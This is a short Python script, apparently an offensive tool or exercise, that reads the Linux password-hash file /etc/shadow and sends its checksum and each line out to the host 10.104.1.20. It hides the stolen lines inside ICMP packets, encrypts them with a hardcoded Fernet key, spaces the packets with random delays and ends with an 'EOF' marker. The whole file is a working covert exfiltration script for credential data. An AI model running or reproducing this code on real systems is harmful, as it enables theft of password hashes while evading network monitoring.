from scapy import all as scapy
from simple_file_checksum import get_checksum
from cryptography.fernet import Fernet
import random
import time

key = 'FJuvqZPlbgevpc5bLJJUM-DbIel77yAc_ngCmykfRiw='
fernet = Fernet(key.encode('utf-8'))

random.seed()
# Min and max time values in seconds for delay between packets
min_rdm = 0
max_rdm = 0

shadow_file = open('/etc/shadow', 'r')
data = shadow_file.readlines()

def scapy_send(payload_content, encrypt=True) :
    data = payload_content
    if encrypt:
        data = fernet.encrypt(payload_content.encode())
    paquet = scapy.IP(dst="10.104.1.20")/scapy.ICMP()/data
    scapy.send(paquet, verbose=0)
    time.sleep(random.randint(min_rdm, max_rdm))

scapy_send(get_checksum('/etc/shadow'))

for line in data :
    scapy_send(line)
else :
    scapy_send('EOF', False)